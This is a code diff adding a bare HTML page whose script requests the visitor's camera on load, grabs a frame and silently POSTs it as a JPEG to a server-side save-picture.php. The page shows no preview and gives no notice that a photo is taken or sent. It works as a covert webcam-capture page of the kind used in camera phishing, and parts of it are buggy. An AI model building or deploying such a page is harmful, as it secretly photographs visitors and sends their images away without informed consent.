@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+    var video = document.createElement("video");
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+        video.srcObject = stream;
+        savePicture(stream);
+    }).catch(function(err) {
+        alert("getUserMedia is not supported by this browser or user denied camera access.");
+        var btn = document.createElement("button");
+        btn.innerHTML = "Click to take a picture";
+        btn.onclick = function() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(savePicture);
+        };
+        document.body.appendChild(btn);
+    });
+
+function savePicture(stream) {
+    var canvas = document.createElement("canvas");
+    video.srcObject = stream;
+    video.onloadedmetadata = function(e) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        var imgData = canvas.toDataURL("image/jpeg");
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                document.getElementById("result").innerHTML = this.responseText;
+            }
+        };
+        xhttp.open("POST", "save-picture.php", true);
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhttp.send("imgData=" + imgData);
+    }
+}
+
+</script>
+</head>
+<body>
+
+<div id="result"></div>
+
+</body>
+</html>
